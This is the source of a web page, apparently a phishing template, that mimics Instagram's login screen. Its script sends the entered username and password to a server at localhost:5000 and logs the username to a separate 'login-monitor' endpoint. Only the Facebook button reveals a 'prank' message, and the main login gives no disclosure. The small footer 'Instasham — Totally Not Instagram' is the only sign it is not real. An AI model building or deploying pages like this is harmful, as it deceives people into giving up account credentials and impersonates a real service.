<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  background: #fafafa;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  gap: 12px;
}

.card {
  background: #fff;
  border: 1px solid #dbdbdb;
  border-radius: 4px;
  padding: 40px 40px 24px;
  width: 100%;
  max-width: 350px;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.logo {
  font-size: 36px;
  font-family: 'Segoe UI', cursive;
  font-style: italic;
  font-weight: 700;
  color: #262626;
  margin-bottom: 24px;
  letter-spacing: -1px;
}
.logo span { color: #e1306c; }

input {
  width: 100%;
  padding: 10px 12px;
  font-size: 12px;
  border: 1px solid #dbdbdb;
  border-radius: 4px;
  background: #fafafa;
  color: #262626;
  outline: none;
  margin-bottom: 8px;
}

.btn {
  width: 100%;
  padding: 8px;
  background: #0095f6;
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 4px;
}
.btn:hover { background: #1877f2; }

.divider {
  display: flex;
  align-items: center;
  gap: 16px;
  width: 100%;
  margin: 18px 0;
}
.divider hr {
  flex: 1;
  border: none;
  border-top: 1px solid #dbdbdb;
}
.divider span {
  font-size: 13px;
  font-weight: 600;
  color: #8e8e8e;
}

.fb-btn {
  background: none;
  border: none;
  color: #385185;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
}
.fb-btn:hover { color: #1877f2; }

.forgot {
  font-size: 12px;
  color: #00376b;
  margin-top: 12px;
  cursor: pointer;
}
.forgot:hover { text-decoration: underline; }

.card2 {
  background: #fff;
  border: 1px solid #dbdbdb;
  border-radius: 4px;
  padding: 20px;
  width: 100%;
  max-width: 350px;
  text-align: center;
  font-size: 14px;
  color: #262626;
}
.card2 a {
  color: #0095f6;
  font-weight: 600;
  text-decoration: none;
}

footer {
  font-size: 11px;
  color: #8e8e8e;
  text-align: center;
  max-width: 350px;
  margin-top: 8px;
}
footer span { margin: 0 6px; }

/* Modal */
.overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  align-items: center;
  justify-content: center;
  z-index: 99;
}
.overlay.show { display: flex; }

.modal {
  background: #fff;
  border-radius: 12px;
  padding: 32px 28px;
  max-width: 300px;
  text-align: center;
  animation: pop 0.2s ease;
}
@keyframes pop {
  from { transform: scale(0.85); opacity: 0; }
  to { transform: scale(1); opacity: 1; }
}

.modal .emoji {
  font-size: 52px;
  margin-bottom: 12px;
}
.modal h2 {
  font-size: 20px;
  font-weight: 700;
  color: #262626;
  margin-bottom: 8px;
}
.modal p {
  font-size: 14px;
  color: #8e8e8e;
  margin-bottom: 20px;
}
.modal button {
  background: #0095f6;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 10px 24px;
  cursor: pointer;
}
.modal button:hover { background: #1877f2; }

</style>
</head>

<body>

<div class="card">
  <div class="logo">Insta<span>gram</span></div>

  <input type="text" id="user" placeholder="Phone number, username, or email">
  <input type="password" id="pass" placeholder="Password">

  <button class="btn" onclick="login()">Log in</button>

  <div class="divider">
    <hr>
    <span>OR</span>
    <hr>
  </div>

  <button class="fb-btn" onclick="prank()">Log in with Facebook</button>

  <p class="forgot">Forgot password?</p>
</div>

<div class="card2">
  Don't have an account? <a href="#">Sign up</a>
</div>

<footer>
  <span>About</span>
  <span>Help</span>
  <span>Press</span>
  <span>API</span>
  <span>Jobs</span>
  <span>Privacy</span>
  <span>Terms</span>
  <br><br>
  © 2025 Instasham — Totally Not Instagram
</footer>

<!-- Modal -->
<div class="overlay" id="overlay">
  <div class="modal">
    <div class="emoji">😂</div>
    <h2>Gotcha!</h2>
    <p>This was a prank login page.</p>
    <button onclick="closeModal()">OK</button>
  </div>
</div>

<script>
async function login() {
  const email = document.getElementById("user").value;
  const password = document.getElementById("pass").value;

  try {
    const res = await fetch("http://localhost:5000/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    });

    const data = await res.json();
    console.log(data);
await fetch("http://localhost:5000/api/login-monitor", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    username: email
  }),
});
    if (data.token) {
      alert("Login successful 🔐");
    } else {
      alert(data.error || "Login failed ❌");
    }

  } catch (err) {
    console.error(err);
    alert("Server error 🚨");
  }
}

function prank() {
  document.getElementById("overlay").classList.add("show");
}

function closeModal() {
  document.getElementById("overlay").classList.remove("show");
}
</script>

</body>
</html>
